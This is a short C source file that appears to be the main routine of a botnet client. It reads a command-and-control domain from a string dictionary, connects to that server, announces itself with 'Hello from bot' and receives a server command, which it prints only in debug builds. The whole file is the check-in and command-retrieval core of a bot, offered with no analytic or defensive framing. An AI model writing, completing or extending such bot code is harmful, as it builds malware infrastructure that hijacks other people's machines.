#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <sys/prctl.h>
#include <sys/select.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <string.h>

#include "ram_mem.h"
#include "utils.h"
#include "receiver.h"

#define RESPONSE_SIZE 4096

int main(void)
{

    dict_init();

    int client_fd;
    struct sockaddr_in server_address;
    char buffer[RESPONSE_SIZE];
    const char *message = "Hello from bot";

    if (receiver_init(&client_fd, &server_address, dict_get(DICT_DOMAIN_NAME)) != 0)
    {
        return 1;
    }

    if (send(client_fd, message, strlen(message), 0) < 0)
    {
        perror("Error: Sending data");
        close(client_fd);
        return 1;
    }

    ssize_t received = recv_server_command(client_fd, buffer, sizeof(buffer));
    if (received < 0)
    {
        close(client_fd);
        return 1;
    }

#ifdef DEBUG
    printf("Received from server: %s\n", buffer);
#endif

    close(client_fd);
    dict_free();
    return 0;
}
